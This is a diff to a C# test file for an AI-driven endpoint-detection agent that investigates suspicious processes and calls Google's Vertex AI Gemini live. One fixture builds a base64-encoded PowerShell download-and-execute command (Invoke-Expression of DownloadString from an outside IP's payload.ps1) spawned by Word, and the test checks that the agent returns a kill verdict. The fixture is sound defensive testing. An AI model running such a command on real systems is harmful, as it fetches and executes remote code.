@@ -3,16 +3,25 @@ using System.Net.Http;
 using System.Text;
 using System.Text.Json;
 using Phalanx.Cockpit.Agent;
+using Phalanx.Cockpit.Agent.Gemini;
 using Phalanx.Cockpit.CQRS;
 using Phalanx.Cockpit.Storage;
 using Phalanx.Cockpit.Tools;
 using Phalanx.Shared.Protos;
 using Xunit;
+using Xunit.Abstractions;
 
 namespace Phalanx.Agent.Tests;
 
 public class AutonomousHunterAgentTests
 {
+    private readonly ITestOutputHelper _output;
+
+    public AutonomousHunterAgentTests(ITestOutputHelper output)
+    {
+        _output = output;
+    }
+
     [Fact]
     public async Task TestAutonomousInvestigationOnSuspendedProcess()
     {
@@ -282,6 +291,91 @@ public class AutonomousHunterAgentTests
         Assert.NotNull(result);
         Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
         Assert.True(result.Elapsed.TotalSeconds < 3.0);
+    }
+
+    [Fact]
+    public async Task TestLiveGoogleVertexAiFromMvConfig()
+    {
+        var client = await GeminiRestClient.TryCreateFromMundusVivensConfigAsync();
+        Assert.NotNull(client);
+
+        string prompt = "Windows EDR 보안 분석 테스트입니다. 'powershell.exe -enc dGVzdA==' 명령줄을 분석하고 간결하게 1줄로 답변하세요.";
+        string response = await client.GenerateContentAsync(prompt);
+
+        Assert.False(string.IsNullOrWhiteSpace(response));
+    }
+
+    [Fact]
+    public async Task TestLiveAutonomousInvestigationWithMvCredentials()
+    {
+        var treeManager = new ProcessTreeProjectionManager();
+        var archiveManager = ForensicArchiveManager.CreateInMemory();
+        var tools = new IInvestigationTool[]
+        {
+            new DecodePayloadTool(),
+            new ProcessMemoryScanTool(),
+            new ThreatReputationTool(),
+            new MitreClassifierTool(),
+            new SystemFirewallTool()
+        };
+
+        // MV 인증정보로 실제 Vertex AI Gemini 클라이언트 자동 연결
+        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+
+        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
+        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
+        string fullCmd = $"powershell.exe -enc {b64}";
+
+        treeManager.ApplySnapshotBatch(new[]
+        {
+            new ProcessEvent
+            {
+                ProcessId = 3104,
+                ImageName = "winword.exe",
+                Lifecycle = ProcessLifecycle.LifecycleSnapshot
+            }
+        });
+
+        treeManager.ApplyDeltaEvent(new ProcessEvent
+        {
+            ProcessId = 8492,
+            ParentProcessId = 3104,
+            ImageName = "powershell.exe",
+            CommandLine = fullCmd,
+            IsSuspended = true,
+            Lifecycle = ProcessLifecycle.LifecycleSuspended
+        });
+
+        var targetNode = treeManager.FindActiveNodeByPid(8492);
+        Assert.NotNull(targetNode);
+
+        var dispatchedCommands = new List<MitigationCommand>();
+
+        // 실행: 실제 구글 클라우드로 요청을 보내서 실시간 추론 진행!
+        var result = await agent.InvestigateAsync(targetNode, cmd =>
+        {
+            dispatchedCommands.Add(cmd);
+            return Task.CompletedTask;
+        });
+
+        // 결과 검증
+        Assert.NotNull(result);
+        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
+        Assert.False(string.IsNullOrWhiteSpace(result.Narrative));
+        Assert.False(string.IsNullOrWhiteSpace(result.SummaryTitle));
+        Assert.True(result.Traces.Count > 0);
+
+        _output.WriteLine($"[LIVE VERDICT] {result.VerdictAction} (Confidence: {result.Confidence:P1})");
+        _output.WriteLine($"[TITLE] {result.SummaryTitle}");
+        _output.WriteLine($"[ELAPSED] {result.Elapsed.TotalMilliseconds:F1}ms");
+        _output.WriteLine($"[NARRATIVE]\n{result.Narrative}");
+        foreach (var trace in result.Traces)
+        {
+            _output.WriteLine($"[STEP {trace.StepNumber}] Tool: {trace.ActionTool}");
+            _output.WriteLine($"  Thought: {trace.Thought}");
+            _output.WriteLine($"  Args: {trace.ActionArgsJson}");
+            _output.WriteLine($"  Observation: {trace.Observation}");
+        }
     }
 
     private class MockHttpMessageHandler : HttpMessageHandler
